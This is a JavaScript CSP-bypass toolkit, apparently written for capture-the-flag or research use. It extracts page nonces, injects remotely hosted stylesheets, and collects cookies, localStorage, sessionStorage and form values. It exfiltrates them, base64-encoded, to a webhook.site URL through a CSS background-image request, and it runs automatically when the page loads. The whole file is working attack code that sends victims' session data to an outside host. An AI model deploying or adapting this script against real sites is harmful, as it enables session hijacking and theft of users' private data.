// CSP Bypass Toolkit - Nonce Extraction and Style Injection
// Purpose: Educational/Research CSP bypass techniques

const NonceExtractor = {
    extract() {
        // DOM-based extraction
        const domNonce = this.extractFromDOM();
        if (domNonce) return domNonce;
        
        // Source code regex extraction
        const regexNonce = this.extractFromSource();
        if (regexNonce) return regexNonce;
        
        // CSP header parsing
        const cspNonce = this.extractFromCSP();
        if (cspNonce) return cspNonce;
        
        return null;
    },
    
    extractFromDOM() {
        const selectors = ['style[nonce]', 'script[nonce]', 'link[nonce]', '[nonce]'];
        
        for (const selector of selectors) {
            const elements = document.querySelectorAll(selector);
            for (const element of elements) {
                const nonce = element.nonce || element.getAttribute('nonce');
                if (nonce) return nonce;
            }
        }
        return null;
    },
    
    extractFromSource() {
        const html = document.documentElement.outerHTML;
        const patterns = [
            /nonce=["']([^"']+)["']/gi,
            /'nonce-([^']+)'/gi,
            /"nonce-([^"]+)"/gi
        ];
        
        for (const pattern of patterns) {
            const match = pattern.exec(html);
            if (match) return match[1];
        }
        return null;
    },
    
    extractFromCSP() {
        const metas = document.querySelectorAll('meta[http-equiv="Content-Security-Policy"]');
        for (const meta of metas) {
            const content = meta.getAttribute('content');
            const nonceMatch = content.match(/'nonce-([^']+)'/);
            if (nonceMatch) return nonceMatch[1];
        }
        return null;
    }
};

const StyleInjector = {
    inject(nonce, type = 'basic') {
        switch (type) {
            case 'basic': return this.injectCSSFile(nonce, 'basic.css');
            case 'comp': return this.injectCSSFile(nonce, 'comp.css');
            case 'exfill': return this.injectCSSFile(nonce, 'exfill.css');
            case 'hunter': return this.injectCSSFile(nonce, 'flag_hunter.css');
            case 'leak': return this.injectCSSFile(nonce, 'leaks.css');
            default: return this.injectCSSFile(nonce, 'basic.css');
        }
    },

    injectCSSFile(nonce, filename) {
        const link = document.createElement('link');
        link.rel = 'stylesheet';
        link.href = `https://cdn.jsdelivr.net/gh/ajinabraham/cdn@main/${filename}`;
        link.setAttribute('nonce', nonce);
        document.head.appendChild(link);
        return true;
    }
};

const DataCollector = {
    collect() {
        return {
            url: location.href,
            domain: location.hostname,
            cookies: document.cookie,
            localStorage: this.getStorage(localStorage),
            sessionStorage: this.getStorage(sessionStorage),
            forms: this.getForms(),
            timestamp: new Date().toISOString()
        };
    },
    
    getStorage(storage) {
        const data = {};
        for (let i = 0; i < storage.length; i++) {
            const key = storage.key(i);
            data[key] = storage.getItem(key);
        }
        return data;
    },
    
    getForms() {
        return Array.from(document.forms).map(form => ({
            action: form.action,
            method: form.method,
            inputs: Array.from(form.elements).map(el => ({
                name: el.name,
                type: el.type,
                value: el.type === 'password' ? '[REDACTED]' : el.value
            }))
        }));
    },
    
    exfiltrate(data, nonce) {
        console.log('Collected data:', data);
        
        // CSS-based exfiltration
        if (nonce) {
            const encoded = btoa(JSON.stringify(data));
            const style = document.createElement('style');
            style.setAttribute('nonce', nonce);
            style.textContent = `body { background-image: url('https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497?data=${encoded}'); }`;
            document.head.appendChild(style);
        }
    }
};

const FlagHunter = {
    hunt() {
        const textContent = document.body.textContent;
        const flagPatterns = [
            /flag\{[^}]+\}/gi,
            /[A-Za-z0-9_]+\{[^}]+\}/gi
        ];
        
        const flags = [];
        flagPatterns.forEach(pattern => {
            const matches = textContent.match(pattern);
            if (matches) flags.push(...matches);
        });
        
        // Search for flag files in links
        const flagLinks = [];
        document.querySelectorAll('a').forEach(link => {
            const href = link.href.toLowerCase();
            const text = link.textContent.toLowerCase();
            if (href.includes('flag') || text.includes('flag')) {
                flagLinks.push({ url: link.href, text: link.textContent.trim() });
            }
        });
        
        return { flags, flagLinks };
    }
};

const CSPBypass = {
    run(mode = 'basic') {
        const nonce = NonceExtractor.extract();
        if (!nonce) {
            console.log('No nonce found - CSP bypass not possible');
            return false;
        }
        
        console.log('Nonce found:', nonce);
        
        switch (mode) {
            case 'exfill':
                StyleInjector.inject(nonce, 'exfill');
                const data = DataCollector.collect();
                DataCollector.exfiltrate(data, nonce);
                break;
            case 'flag':
                StyleInjector.inject(nonce, 'hunter');
                const flags = FlagHunter.hunt();
                console.log('Flags found:', flags);
                break;
            default:
                StyleInjector.inject(nonce, mode);
                break;
        }
        
        return true;
    }
};

// Auto-run and global exposure
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', () => CSPBypass.run());
} else {
    CSPBypass.run();
}

window.CSPBypass = CSPBypass;
window.runBasic = () => CSPBypass.run('basic');
window.runComp = () => CSPBypass.run('comp');
window.runVomp = () => CSPBypass.run('vomp');
window.runExfill = () => CSPBypass.run('exfill');
window.runHunter = () => CSPBypass.run('hunter');
window.runFlag = () => CSPBypass.run('flag');
window.runLeak = () => CSPBypass.run('leak');
